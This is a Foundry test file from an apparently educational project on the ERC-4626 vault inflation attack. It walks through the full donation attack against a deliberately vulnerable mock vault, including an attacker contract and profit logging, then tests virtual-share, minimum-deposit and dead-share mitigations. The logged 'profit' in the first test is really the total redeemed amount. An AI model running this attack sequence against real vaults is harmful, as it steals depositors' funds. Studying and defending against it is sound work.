// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/solution/Project44Solution.sol";

/**
 * @title Project 44 Tests: Inflation Attack Demonstration
 * @notice Comprehensive tests showing attack and all mitigations
 */
contract Project44Test is Test {
    // Test actors
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    // Test token
    MockERC20 token;

    // Vault instances
    VulnerableVault vulnerableVault;
    VaultWithVirtualShares virtualSharesVault;
    VaultWithMinDeposit minDepositVault;
    VaultWithDeadShares deadSharesVault;

    // Test amounts
    uint256 constant INITIAL_BALANCE = 10000 ether;
    uint256 constant ATTACKER_DEPOSIT = 1;
    uint256 constant ATTACKER_DONATION = 1000 ether;
    uint256 constant VICTIM_DEPOSIT = 999 ether;

    function setUp() public {
        // Deploy mock token
        token = new MockERC20();

        // Fund test accounts
        token.mint(attacker, INITIAL_BALANCE);
        token.mint(victim, INITIAL_BALANCE);
        token.mint(user1, INITIAL_BALANCE);
        token.mint(user2, INITIAL_BALANCE);

        // Deploy vulnerable vault
        vulnerableVault = new VulnerableVault(token);

        // Deploy protected vaults
        virtualSharesVault = new VaultWithVirtualShares(token, 3); // offset = 1000
        minDepositVault = new VaultWithMinDeposit(token, 1000 ether);
        deadSharesVault = new VaultWithDeadShares(token);
    }

    // ============================================
    // PART 1: DEMONSTRATE SUCCESSFUL ATTACK
    // ============================================

    /**
     * @notice Test successful inflation attack on vulnerable vault
     * @dev This demonstrates the complete attack flow and profitability
     */
    function test_InflationAttack_Success() public {
        console.log("\n=== INFLATION ATTACK DEMONSTRATION ===\n");

        // Initial state
        uint256 attackerInitial = token.balanceOf(attacker);
        uint256 victimInitial = token.balanceOf(victim);

        console.log("Initial balances:");
        console.log("  Attacker:", attackerInitial / 1 ether, "ether");
        console.log("  Victim:", victimInitial / 1 ether, "ether");

        // ========== STEP 1: Attacker deposits minimal amount ==========
        console.log("\n--- Step 1: Attacker deposits 1 wei ---");

        vm.startPrank(attacker);
        token.approve(address(vulnerableVault), type(uint256).max);
        vulnerableVault.deposit(ATTACKER_DEPOSIT, attacker);
        vm.stopPrank();

        uint256 attackerShares = vulnerableVault.balanceOf(attacker);
        console.log("Attacker shares:", attackerShares);
        console.log("Total supply:", vulnerableVault.totalSupply());
        console.log("Total assets:", vulnerableVault.totalAssets());
        console.log("Share price:", vulnerableVault.totalAssets() / vulnerableVault.totalSupply(), "wei/share");

        assertEq(attackerShares, 1, "Attacker should have 1 share");

        // ========== STEP 2: Attacker donates large amount ==========
        console.log("\n--- Step 2: Attacker donates", ATTACKER_DONATION / 1 ether, "ether ---");

        vm.prank(attacker);
        token.transfer(address(vulnerableVault), ATTACKER_DONATION);

        console.log("Total supply:", vulnerableVault.totalSupply());
        console.log("Total assets:", vulnerableVault.totalAssets() / 1 ether, "ether");
        console.log("Share price:", vulnerableVault.totalAssets() / vulnerableVault.totalSupply() / 1 ether, "ether/share");

        // Share price is now massively inflated!
        assertEq(vulnerableVault.totalSupply(), 1, "Supply should still be 1");
        assertEq(
            vulnerableVault.totalAssets(),
            ATTACKER_DEPOSIT + ATTACKER_DONATION,
            "Assets should include donation"
        );

        // ========== STEP 3: Victim deposits ==========
        console.log("\n--- Step 3: Victim deposits", VICTIM_DEPOSIT / 1 ether, "ether ---");

        uint256 previewShares = vulnerableVault.previewDeposit(VICTIM_DEPOSIT);
        console.log("Expected shares for victim:", previewShares);

        vm.startPrank(victim);
        token.approve(address(vulnerableVault), type(uint256).max);
        vulnerableVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        uint256 victimShares = vulnerableVault.balanceOf(victim);
        console.log("Victim shares received:", victimShares);

        // CRITICAL: Victim got 0 shares!
        assertEq(victimShares, 0, "Victim should get 0 shares due to rounding");

        console.log("\nVault state after victim deposit:");
        console.log("  Total supply:", vulnerableVault.totalSupply());
        console.log("  Total assets:", vulnerableVault.totalAssets() / 1 ether, "ether");
        console.log("  Attacker owns", (attackerShares * 100) / vulnerableVault.totalSupply(), "% of shares");

        // ========== STEP 4: Attacker withdraws ==========
        console.log("\n--- Step 4: Attacker redeems shares ---");

        vm.prank(attacker);
        uint256 assetsRedeemed = vulnerableVault.redeem(
            attackerShares,
            attacker,
            attacker
        );

        console.log("Assets redeemed:", assetsRedeemed / 1 ether, "ether");

        // ========== PROFIT CALCULATION ==========
        uint256 attackerFinal = token.balanceOf(attacker);
        uint256 victimFinal = token.balanceOf(victim);

        uint256 attackerCost = ATTACKER_DEPOSIT + ATTACKER_DONATION;
        uint256 attackerProfit = attackerFinal - (attackerInitial - attackerCost);
        uint256 victimLoss = victimInitial - victimFinal;

        console.log("\n=== ATTACK RESULTS ===");
        console.log("Attacker:");
        console.log("  Investment:", attackerCost / 1 ether, "ether");
        console.log("  Redeemed:", assetsRedeemed / 1 ether, "ether");
        console.log("  Profit:", attackerProfit / 1 ether, "ether");
        console.log("\nVictim:");
        console.log("  Deposited:", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("  Shares received:", victimShares);
        console.log("  Loss:", victimLoss / 1 ether, "ether");

        // Verify the attack was profitable
        assertGt(attackerProfit, 0, "Attacker should profit");
        assertEq(victimLoss, VICTIM_DEPOSIT, "Victim should lose entire deposit");

        console.log("\n✓ Attack successful - victim's funds stolen!\n");
    }

    /**
     * @notice Test attack using the InflationAttacker contract
     */
    function test_InflationAttacker_Contract() public {
        console.log("\n=== INFLATION ATTACKER CONTRACT TEST ===\n");

        // Deploy attacker contract
        vm.prank(attacker);
        InflationAttacker attackerContract = new InflationAttacker(
            address(vulnerableVault)
        );

        // Fund attacker contract
        vm.prank(attacker);
        token.transfer(address(attackerContract), ATTACKER_DEPOSIT + ATTACKER_DONATION);

        // Execute attack
        vm.prank(attacker);
        attackerContract.executeAttack(ATTACKER_DONATION);

        console.log("Attack executed:");
        console.log("  Initial deposit:", attackerContract.initialDeposit());
        console.log("  Donation:", attackerContract.donationAmount() / 1 ether, "ether");
        console.log("  Vault total assets:", vulnerableVault.totalAssets() / 1 ether, "ether");
        console.log("  Vault total supply:", vulnerableVault.totalSupply());

        // Victim deposits
        vm.startPrank(victim);
        token.approve(address(vulnerableVault), type(uint256).max);
        vulnerableVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        uint256 victimShares = vulnerableVault.balanceOf(victim);
        console.log("\nVictim deposited", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("Victim received", victimShares, "shares");

        // Check if victim would get zero shares
        bool wouldGetZero = attackerContract.victimWouldGetZeroShares(VICTIM_DEPOSIT);
        console.log("Would victim get 0 shares?", wouldGetZero ? "YES" : "NO");

        // Attacker collects profit
        vm.prank(attacker);
        uint256 profit = attackerContract.collectProfit();

        console.log("\nAttacker collected profit:", profit / 1 ether, "ether");
        console.log("Final withdrawal:", attackerContract.finalWithdrawal() / 1 ether, "ether");

        assertEq(victimShares, 0, "Victim should get 0 shares");
        assertGt(profit, 0, "Attack should be profitable");

        console.log("\n✓ Attacker contract successfully executed attack!\n");
    }

    /**
     * @notice Test economic boundaries of the attack
     */
    function test_Attack_EconomicAnalysis() public {
        console.log("\n=== ATTACK ECONOMIC ANALYSIS ===\n");

        // Test various victim deposit amounts
        uint256[] memory victimAmounts = new uint256[](5);
        victimAmounts[0] = 100 ether;   // Less than donation
        victimAmounts[1] = 500 ether;   // Less than donation
        victimAmounts[2] = 999 ether;   // Just under donation
        victimAmounts[3] = 1000 ether;  // Equal to donation
        victimAmounts[4] = 1500 ether;  // More than donation

        for (uint256 i = 0; i < victimAmounts.length; i++) {
            // Fresh vault for each test
            VulnerableVault vault = new VulnerableVault(token);

            // Setup attack
            vm.startPrank(attacker);
            token.approve(address(vault), type(uint256).max);
            vault.deposit(1, attacker);
            token.transfer(address(vault), ATTACKER_DONATION);
            vm.stopPrank();

            // Calculate expected shares for victim
            uint256 expectedShares = vault.previewDeposit(victimAmounts[i]);

            // Calculate if attack would be profitable
            uint256 cost = 1 + ATTACKER_DONATION;
            int256 expectedProfit = int256(victimAmounts[i]) - int256(ATTACKER_DONATION);

            console.log("\nScenario", i + 1, "- Victim deposits:", victimAmounts[i] / 1 ether, "ether");
            console.log("  Expected shares:", expectedShares);
            console.log("  Attack cost:", cost / 1 ether, "ether");
            console.log("  Expected profit:", expectedProfit > 0 ? uint256(expectedProfit) / 1 ether : 0, "ether");
            console.log("  Profitable?", expectedProfit > 0 ? "YES" : "NO");

            if (victimAmounts[i] < ATTACKER_DONATION) {
                assertEq(expectedShares, 0, "Should get 0 shares");
                assertLt(expectedProfit, 0, "Should not be profitable");
            }
        }

        console.log("\n✓ Economic analysis complete\n");
    }

    // ============================================
    // PART 2: TEST VIRTUAL SHARES MITIGATION
    // ============================================

    /**
     * @notice Test that virtual shares prevent the attack
     */
    function test_VirtualShares_PreventsAttack() public {
        console.log("\n=== VIRTUAL SHARES MITIGATION TEST ===\n");

        console.log("Vault offset:", 3, "(1000 virtual shares)");

        // Attempt attack
        vm.startPrank(attacker);
        token.approve(address(virtualSharesVault), type(uint256).max);
        virtualSharesVault.deposit(ATTACKER_DEPOSIT, attacker);
        token.transfer(address(virtualSharesVault), ATTACKER_DONATION);
        vm.stopPrank();

        console.log("\nAfter attack setup:");
        console.log("  Total supply:", virtualSharesVault.totalSupply());
        console.log("  Total assets:", virtualSharesVault.totalAssets() / 1 ether, "ether");

        // Victim deposits
        uint256 expectedShares = virtualSharesVault.previewDeposit(VICTIM_DEPOSIT);
        console.log("\nVictim deposits", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("  Expected shares:", expectedShares);

        vm.startPrank(victim);
        token.approve(address(virtualSharesVault), type(uint256).max);
        virtualSharesVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        uint256 victimShares = virtualSharesVault.balanceOf(victim);
        console.log("  Actual shares:", victimShares);

        // With virtual shares, victim should get shares!
        assertGt(victimShares, 0, "Victim should receive shares with virtual offset");

        // Calculate attacker's potential profit
        uint256 attackerShares = virtualSharesVault.balanceOf(attacker);
        uint256 totalShares = virtualSharesVault.totalSupply();
        uint256 attackerPortion = (attackerShares * 10000) / totalShares; // basis points

        console.log("\nAttacker ownership:", attackerPortion / 100, ".", attackerPortion % 100, "%");

        // Attacker should own much less than 100%
        assertLt(attackerPortion, 9900, "Attacker should not own >99% of shares");

        console.log("\n✓ Virtual shares successfully prevented attack!\n");
    }

    /**
     * @notice Test different virtual share offsets
     */
    function test_VirtualShares_DifferentOffsets() public {
        console.log("\n=== TESTING DIFFERENT VIRTUAL OFFSETS ===\n");

        uint8[] memory offsets = new uint8[](4);
        offsets[0] = 0;  // No offset (vulnerable)
        offsets[1] = 1;  // 10 virtual shares
        offsets[2] = 3;  // 1000 virtual shares
        offsets[3] = 6;  // 1M virtual shares

        for (uint256 i = 0; i < offsets.length; i++) {
            VaultWithVirtualShares vault = new VaultWithVirtualShares(token, offsets[i]);

            // Setup attack
            vm.startPrank(attacker);
            token.approve(address(vault), type(uint256).max);
            vault.deposit(1, attacker);
            token.transfer(address(vault), ATTACKER_DONATION);
            vm.stopPrank();

            // Victim deposits
            uint256 expectedShares = vault.previewDeposit(VICTIM_DEPOSIT);

            console.log("Offset:", offsets[i], "(", 10 ** offsets[i], "virtual shares)");
            console.log("  Victim would get:", expectedShares, "shares");
            console.log("  Protected?", expectedShares > 0 ? "YES" : "NO");
            console.log("");

            if (offsets[i] >= 3) {
                assertGt(expectedShares, 0, "Should be protected with offset >= 3");
            }
        }

        console.log("✓ Higher offsets provide better protection\n");
    }

    // ============================================
    // PART 3: TEST MINIMUM DEPOSIT MITIGATION
    // ============================================

    /**
     * @notice Test that minimum deposit prevents attack
     */
    function test_MinDeposit_PreventsAttack() public {
        console.log("\n=== MINIMUM DEPOSIT MITIGATION TEST ===\n");

        uint256 minDeposit = minDepositVault.MIN_FIRST_DEPOSIT();
        console.log("Minimum first deposit:", minDeposit / 1 ether, "ether");

        // Attacker tries to deposit 1 wei
        vm.startPrank(attacker);
        token.approve(address(minDepositVault), type(uint256).max);

        vm.expectRevert("First deposit must meet minimum");
        minDepositVault.deposit(1, attacker);

        console.log("\n✓ Cannot deposit less than minimum");

        // Attacker forced to deposit minimum
        minDepositVault.deposit(minDeposit, attacker);
        console.log("✓ Attacker deposited", minDeposit / 1 ether, "ether");

        vm.stopPrank();

        // Even with donation, attack is now expensive
        vm.prank(attacker);
        token.transfer(address(minDepositVault), ATTACKER_DONATION);

        console.log("✓ Attacker donated", ATTACKER_DONATION / 1 ether, "ether");

        // Victim deposits
        vm.startPrank(victim);
        token.approve(address(minDepositVault), type(uint256).max);
        minDepositVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        uint256 victimShares = minDepositVault.balanceOf(victim);
        console.log("\nVictim deposited", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("  Received shares:", victimShares);

        // Calculate economics
        uint256 attackCost = minDeposit + ATTACKER_DONATION;
        console.log("\nAttack economics:");
        console.log("  Attack cost:", attackCost / 1 ether, "ether");
        console.log("  Victim deposit:", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("  Profitable?", VICTIM_DEPOSIT > attackCost ? "YES" : "NO");

        // With these numbers, attack is not profitable
        assertGt(attackCost, VICTIM_DEPOSIT, "Attack should not be profitable");

        console.log("\n✓ Minimum deposit makes attack economically unfeasible!\n");
    }

    /**
     * @notice Test that subsequent deposits work normally
     */
    function test_MinDeposit_SubsequentDepositsNormal() public {
        // First user deposits minimum
        vm.startPrank(user1);
        token.approve(address(minDepositVault), type(uint256).max);
        minDepositVault.deposit(minDepositVault.MIN_FIRST_DEPOSIT(), user1);
        vm.stopPrank();

        // Second user can deposit any amount
        vm.startPrank(user2);
        token.approve(address(minDepositVault), type(uint256).max);
        uint256 smallDeposit = 1 ether;
        minDepositVault.deposit(smallDeposit, user2);
        vm.stopPrank();

        uint256 user2Shares = minDepositVault.balanceOf(user2);
        assertGt(user2Shares, 0, "Small deposits should work after first");

        console.log("✓ Subsequent deposits work normally");
    }

    // ============================================
    // PART 4: TEST DEAD SHARES MITIGATION
    // ============================================

    /**
     * @notice Test that dead shares prevent attack
     */
    function test_DeadShares_PreventsAttack() public {
        console.log("\n=== DEAD SHARES MITIGATION TEST ===\n");

        uint256 deadShares = deadSharesVault.DEAD_SHARES();
        console.log("Dead shares amount:", deadShares);

        // Attacker makes first deposit
        vm.startPrank(attacker);
        token.approve(address(deadSharesVault), type(uint256).max);

        // Must deposit more than dead shares
        uint256 firstDeposit = deadShares + 1000;
        deadSharesVault.deposit(firstDeposit, attacker);
        vm.stopPrank();

        uint256 attackerShares = deadSharesVault.balanceOf(attacker);
        uint256 deadBalance = deadSharesVault.deadSharesBalance();

        console.log("\nFirst deposit:", firstDeposit);
        console.log("  Attacker received:", attackerShares, "shares");
        console.log("  Dead address received:", deadBalance, "shares");
        console.log("  Total supply:", deadSharesVault.totalSupply());

        assertEq(deadBalance, deadShares, "Dead shares should be minted");
        assertEq(attackerShares, firstDeposit - deadShares, "Attacker gets reduced shares");

        // Attacker donates
        vm.prank(attacker);
        token.transfer(address(deadSharesVault), ATTACKER_DONATION);

        console.log("\nAttacker donated:", ATTACKER_DONATION / 1 ether, "ether");
        console.log("  Total supply:", deadSharesVault.totalSupply());
        console.log("  Total assets:", deadSharesVault.totalAssets() / 1 ether, "ether");

        // Victim deposits
        uint256 expectedShares = deadSharesVault.previewDeposit(VICTIM_DEPOSIT);
        console.log("\nVictim deposits", VICTIM_DEPOSIT / 1 ether, "ether");
        console.log("  Expected shares:", expectedShares);

        vm.startPrank(victim);
        token.approve(address(deadSharesVault), type(uint256).max);
        deadSharesVault.deposit(VICTIM_DEPOSIT, victim);
        vm.stopPrank();

        uint256 victimShares = deadSharesVault.balanceOf(victim);
        console.log("  Actual shares:", victimShares);

        // Victim should get shares due to dead shares protection
        assertGt(victimShares, 0, "Victim should receive shares");

        // Check attacker ownership
        uint256 totalShares = deadSharesVault.totalSupply();
        uint256 attackerOwnership = (attackerShares * 10000) / totalShares;

        console.log("\nAttacker ownership:", attackerOwnership / 100, ".", attackerOwnership % 100, "%");
        assertLt(attackerOwnership, 9900, "Attacker should not control vault");

        console.log("\n✓ Dead shares successfully prevented attack!\n");
    }

    /**
     * @notice Test dead shares are permanent
     */
    function test_DeadShares_ArePermanent() public {
        // Initialize vault
        vm.startPrank(user1);
        token.approve(address(deadSharesVault), type(uint256).max);
        deadSharesVault.deposit(10000, user1);
        vm.stopPrank();

        uint256 deadBalance = deadSharesVault.deadSharesBalance();
        assertEq(deadBalance, deadSharesVault.DEAD_SHARES(), "Dead shares minted");

        // Try to transfer dead shares (should have no private key)
        address deadAddr = deadSharesVault.DEAD_ADDRESS();

        // Dead address cannot transfer (no one has private key)
        vm.prank(deadAddr);
        vm.expectRevert(); // Will fail - no one controls this address
        deadSharesVault.transfer(attacker, deadBalance);

        console.log("✓ Dead shares are permanently locked");
    }

    /**
     * @notice Test that only first deposit burns shares
     */
    function test_DeadShares_OnlyFirstDeposit() public {
        // First deposit
        vm.startPrank(user1);
        token.approve(address(deadSharesVault), type(uint256).max);
        deadSharesVault.deposit(10000, user1);
        vm.stopPrank();

        uint256 deadBalanceAfterFirst = deadSharesVault.deadSharesBalance();

        // Second deposit
        vm.startPrank(user2);
        token.approve(address(deadSharesVault), type(uint256).max);
        deadSharesVault.deposit(5000, user2);
        vm.stopPrank();

        uint256 deadBalanceAfterSecond = deadSharesVault.deadSharesBalance();

        assertEq(
            deadBalanceAfterFirst,
            deadBalanceAfterSecond,
            "Dead shares only minted once"
        );

        console.log("✓ Dead shares only burned on first deposit");
    }

    // ============================================
    // PART 5: COMPARATIVE ANALYSIS
    // ============================================

    /**
     * @notice Compare all mitigations side by side
     */
    function test_CompareMitigations() public {
        console.log("\n=== MITIGATION COMPARISON ===\n");

        // Setup attack on all vaults
        VulnerableVault[] memory vaults = new VulnerableVault[](1);
        vaults[0] = vulnerableVault;

        string[] memory names = new string[](4);
        names[0] = "Vulnerable";
        names[1] = "Virtual Shares";
        names[2] = "Min Deposit";
        names[3] = "Dead Shares";

        // Test vulnerable vault
        {
            vm.startPrank(attacker);
            token.approve(address(vulnerableVault), type(uint256).max);
            vulnerableVault.deposit(1, attacker);
            token.transfer(address(vulnerableVault), ATTACKER_DONATION);
            vm.stopPrank();

            vm.startPrank(victim);
            token.approve(address(vulnerableVault), type(uint256).max);
            vulnerableVault.deposit(VICTIM_DEPOSIT, victim);
            vm.stopPrank();

            uint256 shares = vulnerableVault.balanceOf(victim);
            console.log("Vulnerable Vault:");
            console.log("  Victim shares:", shares);
            console.log("  Protected?", shares > 0 ? "YES" : "NO");
            console.log("");
        }

        // Test virtual shares vault
        {
            vm.startPrank(attacker);
            token.approve(address(virtualSharesVault), type(uint256).max);
            virtualSharesVault.deposit(1, attacker);
            token.transfer(address(virtualSharesVault), ATTACKER_DONATION);
            vm.stopPrank();

            vm.startPrank(victim);
            token.approve(address(virtualSharesVault), type(uint256).max);
            virtualSharesVault.deposit(VICTIM_DEPOSIT, victim);
            vm.stopPrank();

            uint256 shares = virtualSharesVault.balanceOf(victim);
            console.log("Virtual Shares Vault:");
            console.log("  Victim shares:", shares);
            console.log("  Protected?", shares > 0 ? "YES" : "NO");
            console.log("");
        }

        // Test min deposit vault
        {
            vm.startPrank(attacker);
            token.approve(address(minDepositVault), type(uint256).max);
            minDepositVault.deposit(minDepositVault.MIN_FIRST_DEPOSIT(), attacker);
            token.transfer(address(minDepositVault), ATTACKER_DONATION);
            vm.stopPrank();

            vm.startPrank(victim);
            token.approve(address(minDepositVault), type(uint256).max);
            minDepositVault.deposit(VICTIM_DEPOSIT, victim);
            vm.stopPrank();

            uint256 shares = minDepositVault.balanceOf(victim);
            console.log("Min Deposit Vault:");
            console.log("  Victim shares:", shares);
            console.log("  Protected?", shares > 0 ? "YES" : "NO");
            console.log("");
        }

        // Test dead shares vault
        {
            vm.startPrank(attacker);
            token.approve(address(deadSharesVault), type(uint256).max);
            deadSharesVault.deposit(2000, attacker);
            token.transfer(address(deadSharesVault), ATTACKER_DONATION);
            vm.stopPrank();

            vm.startPrank(victim);
            token.approve(address(deadSharesVault), type(uint256).max);
            deadSharesVault.deposit(VICTIM_DEPOSIT, victim);
            vm.stopPrank();

            uint256 shares = deadSharesVault.balanceOf(victim);
            console.log("Dead Shares Vault:");
            console.log("  Victim shares:", shares);
            console.log("  Protected?", shares > 0 ? "YES" : "NO");
            console.log("");
        }

        console.log("✓ All protected vaults prevent the attack\n");
    }

    /**
     * @notice Test gas costs of different mitigations
     */
    function test_GasCosts() public {
        console.log("\n=== GAS COST COMPARISON ===\n");

        // Measure vulnerable vault
        uint256 gasStart = gasleft();
        vm.startPrank(user1);
        token.approve(address(vulnerableVault), type(uint256).max);
        vulnerableVault.deposit(1000 ether, user1);
        vm.stopPrank();
        uint256 gasUsed1 = gasStart - gasleft();

        // Measure virtual shares vault
        gasStart = gasleft();
        vm.startPrank(user1);
        token.approve(address(virtualSharesVault), type(uint256).max);
        virtualSharesVault.deposit(1000 ether, user1);
        vm.stopPrank();
        uint256 gasUsed2 = gasStart - gasleft();

        // Measure min deposit vault
        gasStart = gasleft();
        vm.startPrank(user1);
        token.approve(address(minDepositVault), type(uint256).max);
        minDepositVault.deposit(1000 ether, user1);
        vm.stopPrank();
        uint256 gasUsed3 = gasStart - gasleft();

        // Measure dead shares vault (first deposit)
        gasStart = gasleft();
        vm.startPrank(user1);
        token.approve(address(deadSharesVault), type(uint256).max);
        deadSharesVault.deposit(1000 ether, user1);
        vm.stopPrank();
        uint256 gasUsed4 = gasStart - gasleft();

        console.log("Gas costs for deposit:");
        console.log("  Vulnerable:", gasUsed1);
        console.log("  Virtual Shares:", gasUsed2);
        console.log("  Min Deposit:", gasUsed3);
        console.log("  Dead Shares:", gasUsed4);

        console.log("\n✓ All mitigations have reasonable gas costs\n");
    }

    // ============================================
    // PART 6: EDGE CASES
    // ============================================

    /**
     * @notice Test with very large donation
     */
    function test_EdgeCase_LargeDonation() public {
        VulnerableVault vault = new VulnerableVault(token);

        // Massive donation
        uint256 hugeDonation = 1_000_000 ether;
        token.mint(attacker, hugeDonation);

        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), hugeDonation);
        vm.stopPrank();

        // Even large deposits get 0 shares
        uint256 largeDeposit = 100_000 ether;
        token.mint(victim, largeDeposit);

        uint256 expectedShares = vault.previewDeposit(largeDeposit);
        console.log("Huge donation:", hugeDonation / 1 ether, "ether");
        console.log("Large deposit:", largeDeposit / 1 ether, "ether");
        console.log("Expected shares:", expectedShares);

        assertEq(expectedShares, 0, "Even large deposits get 0 shares");
    }

    /**
     * @notice Test with multiple victims
     */
    function test_EdgeCase_MultipleVictims() public {
        VulnerableVault vault = new VulnerableVault(token);

        // Setup attack
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), ATTACKER_DONATION);
        vm.stopPrank();

        // Multiple victims deposit
        address[] memory victims = new address[](3);
        victims[0] = makeAddr("victim1");
        victims[1] = makeAddr("victim2");
        victims[2] = makeAddr("victim3");

        for (uint256 i = 0; i < victims.length; i++) {
            token.mint(victims[i], VICTIM_DEPOSIT);

            vm.startPrank(victims[i]);
            token.approve(address(vault), type(uint256).max);
            vault.deposit(VICTIM_DEPOSIT, victims[i]);
            vm.stopPrank();

            uint256 shares = vault.balanceOf(victims[i]);
            assertEq(shares, 0, "All victims should get 0 shares");
        }

        // Attacker redeems and gets all deposits
        vm.prank(attacker);
        uint256 redeemed = vault.redeem(1, attacker, attacker);

        uint256 expectedTotal = 1 + ATTACKER_DONATION + (VICTIM_DEPOSIT * 3);
        assertEq(redeemed, expectedTotal, "Attacker gets all victim deposits");

        console.log("✓ Multiple victims all lose deposits");
    }
}

/**
 * @title MockERC20
 * @notice Simple ERC20 for testing
 */
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
